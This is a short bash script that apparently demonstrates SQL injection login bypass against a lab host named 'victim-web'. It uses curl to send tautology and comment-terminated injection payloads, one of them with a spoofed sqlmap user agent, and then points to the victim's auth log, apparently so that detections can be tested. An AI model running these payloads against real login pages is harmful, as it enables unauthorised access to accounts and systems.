#!/usr/bin/env bash
# Demonstrate SQL injection auth bypass against victim-web (no sqlmap needed).
# Usage: ./attack_web_sqli.sh [host] [port]
set -euo pipefail
HOST="${1:-victim-web}"
PORT="${2:-8081}"
URL="http://$HOST:$PORT/login"
echo "[*] Baseline (should FAIL / 401):"
curl -s -o /dev/null -w "  HTTP %{http_code}\n" -X POST "$URL" \
  --data "username=admin&password=wrongpass"

echo "[*] SQL injection tautology (should SUCCEED / 200):"
curl -s -w "\n  HTTP %{http_code}\n" -X POST "$URL" \
  --data "username=admin&password=' OR '1'='1"

echo "[*] Injection via username with UNION-style probe:"
curl -s -o /dev/null -w "  HTTP %{http_code}\n" -X POST "$URL" \
  -A "sqlmap/1.7" --data "username=' OR 1=1 -- -&password=x"
echo "[*] Done. Check the victim-web auth log for the injection strings."
